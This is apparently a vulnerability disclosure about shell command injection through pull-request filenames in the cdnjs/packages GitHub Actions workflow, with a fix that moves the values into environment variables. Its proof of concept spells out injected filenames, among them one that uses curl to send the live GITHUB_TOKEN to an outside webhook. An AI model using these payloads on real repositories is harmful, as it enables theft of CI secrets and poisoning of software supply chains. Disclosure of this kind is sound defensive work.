# GitHub Actions Expression Injection in cdnjs/packages — GITHUB_TOKEN Exfiltration via Malicious PR Filename

## Summary

The `cdnjs/packages` CI workflow is vulnerable to GitHub Actions expression injection. By opening a pull request with a file whose name contains shell metacharacters, an attacker can execute arbitrary commands on the GitHub Actions runner and exfiltrate the `GITHUB_TOKEN` secret. With this token, an attacker could interact with the repository as the Actions bot — approving workflow runs, commenting on PRs, and potentially merging pull requests if branch protection rules permit it — with the goal of introducing malicious package entries into cdnjs and poisoning the CDN that serves JavaScript assets to millions of websites.

---

## Vulnerability Details

**Type:** GitHub Actions Expression Injection (CWE-78 — OS Command Injection)
**File:** `.github/workflows/main.yml`
**Affected lines:** 34–36 (lint package step), 50–52 (compute files step)
**Severity:** High

### Vulnerable Code

```yaml
# lint package step (lines 34–36)
- name: lint package
  id: lint
  run: bash ./scripts/lint.sh \
      ${{ steps.diff.outputs.files_modified }} \
      ${{ steps.diff.outputs.files_added }}

# compute files step (lines 50–52)
- name: compute files
  id: files
  env:
    DOCKER_IMAGE: ghcr.io/cdnjs/tools:cf63aa8265f012629ca4dad9d431f90311d68bcc2
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  run: bash ./scripts/show-files.sh \
      ${{ steps.diff.outputs.files_modified }} \
      ${{ steps.diff.outputs.files_added }}
```

### Root Cause

GitHub Actions evaluates `${{ ... }}` expressions at template expansion time, before the shell is invoked. The outputs `files_modified` and `files_added` from `dorner/file-changes-action` contain the filenames of files changed in the PR. These values are interpolated directly into the `run:` block with no quoting or sanitization.

If a PR adds a file whose name contains shell metacharacters (e.g. `$(command)`), bash interprets the substituted value as a command and executes it. This is a well-documented GitHub Actions vulnerability class.

---

## Proof of Concept

### Step 1 — Confirm RCE

A PR was opened adding a file named:

```
packages/a/$(id).json
```

The CI runner executed `id` and its output appeared in the workflow logs:

```
package path `groups=1001(runner),4(adm),100(users),118(docker),999(systemd-journal).json`
does not match ^packages/([a-z0-9])/([a-zA-Z0-9._-]+).json$
```

The `id` command ran on the runner and its output (word-split by bash) was passed as the filename argument. **Remote code execution confirmed.**

### Step 2 — Confirm Environment Variable Access

A PR was opened adding a file named:

```
packages/a/$(echo $GITHUB_SHA).json
```

The workflow logs showed the actual commit SHA:

```
package `4b340fac2caf6186e3dd066601d06d6ea1b06255` must go into `4` dir, not `a` dir
```

**Environment variable expansion confirmed.**

### Step 3 — Exfiltrate GITHUB_TOKEN

The `compute files` step explicitly sets `GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}` in its environment. To reach this step, the `lint` step must exit successfully.

By configuring the webhook endpoint to return `a-happy-tyler` as its response body, the injected filename expands to `packages/a/a-happy-tyler.json` — a valid path that passes the linter. The `compute files` step then runs with `GH_TOKEN` in its environment.

A PR was opened adding a file named:

```
packages/a/$(curl -s https://[redacted-webhook]?t=$GH_TOKEN).json
```

The webhook received a GET request containing the live `GITHUB_TOKEN` as a query parameter. **Secret exfiltration confirmed.**

The exfiltrated token was a valid `ghs_`-prefixed GitHub Actions token scoped to the `cdnjs/packages` repository.

---

## Impact

With the exfiltrated `GITHUB_TOKEN`, an attacker can:

1. **Interact with the repository as the Actions bot** — approving workflow runs, commenting on PRs, and potentially merging pull requests if branch protection rules permit it
2. **If merging is possible: add or modify package entries** that point the auto-updater at attacker-controlled npm packages or git repositories
3. **If malicious entries are merged: serve malicious JavaScript** to every website using cdnjs — cdnjs is used by a significant portion of the web

The attack requires only the ability to open a pull request, which is available to any GitHub user on a public repository.

### Severity Adjustment for Workflow Approval Setting

The repository requires approval for all outside collaborators (the strictest GitHub setting). Every PR from a non-member requires a maintainer to approve the workflow run before it executes, regardless of contributor history. This means the attack requires an additional social engineering step, reducing the severity from Critical to **High**.

However:

- Maintainers approve workflow runs, not individual filenames — the malicious filename is not prominently surfaced in the approval UI
- The vulnerable code path exists regardless and should be remediated

---

## Remediation

### Immediate Fix — Use environment variables

```yaml
- name: lint package
  env:
    FILES_MODIFIED: ${{ steps.diff.outputs.files_modified }}
    FILES_ADDED: ${{ steps.diff.outputs.files_added }}
  run: bash ./scripts/lint.sh "$FILES_MODIFIED" "$FILES_ADDED"

- name: compute files
  env:
    DOCKER_IMAGE: ghcr.io/cdnjs/tools:cf63aa8265f012629ca4dad9d431f90311d68bcc2
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    FILES_MODIFIED: ${{ steps.diff.outputs.files_modified }}
    FILES_ADDED: ${{ steps.diff.outputs.files_added }}
  run: bash ./scripts/show-files.sh "$FILES_MODIFIED" "$FILES_ADDED"
```

Setting the value via `env:` prevents expression injection because environment variables are not subject to shell interpretation at assignment time.

---

## References

- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)